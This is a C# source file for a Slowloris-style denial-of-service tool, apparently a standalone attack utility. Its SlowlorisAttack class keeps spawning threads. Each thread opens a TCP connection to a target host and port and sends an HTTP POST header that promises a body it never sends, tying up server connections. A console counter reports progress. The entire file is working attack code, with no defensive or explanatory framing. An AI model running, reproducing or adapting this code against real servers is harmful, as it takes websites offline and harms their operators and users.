using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace SlowLoris
{
    class SlowlorisAttack
    {
        public bool loop = false;
        public string Website;
        public int count = 0;
        public int port;
        public int threadSleep;
       


        public SlowlorisAttack(string Host, int Port , int ThreadSleep , bool Loop)
        {
            Website = Host;
            port = Port;
            loop = Loop;
            threadSleep = ThreadSleep;
        }
        public void Manage()
        {
            try
            {
                ThreadStart start = null;
                List<TcpClient> clients = new List<TcpClient>();

                while (loop)
                {
                  

                    if (start == null)
                    {
                       
                        start = delegate
                        {
                            TcpClient item = new TcpClient();
                            clients.Add(item);
                          
                            try
                            {

                                //item.Connect(Website, 80);
                                item.Connect(Website, port);
                                StreamWriter writer = new StreamWriter(item.GetStream());
                                writer.Write("POST / HTTP/1.1\r\nHost: " + Website + "\r\nContent-length: 5235\r\n\r\n");
                                writer.Flush();
                                if (loop)
                                {
                                    Console.Clear();
                                    Console.WriteLine("AMOUNT OF PACKETS SENT: " + count);
                                 
                                }
                                count++;

                            }
                            catch(Exception ex)
                            {
                                if (loop)
                                {
                                    Console.Clear();
                                    Console.WriteLine("PACKETS WERE UNABLE TO REACH SERVER");
                                    Console.ReadKey();
                                   
                                }
                                Console.WriteLine(ex.Message);
                                loop = false;
                            }
                        };
                    }
                  

                    new Thread(start).Start();
                    //Thread.Sleep(1000); 
                    Thread.Sleep(threadSleep);
                }
                foreach (TcpClient client in clients)
                {
                    
                    try
                    {
                        client.GetStream().Dispose();
                       
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
     
    }
}
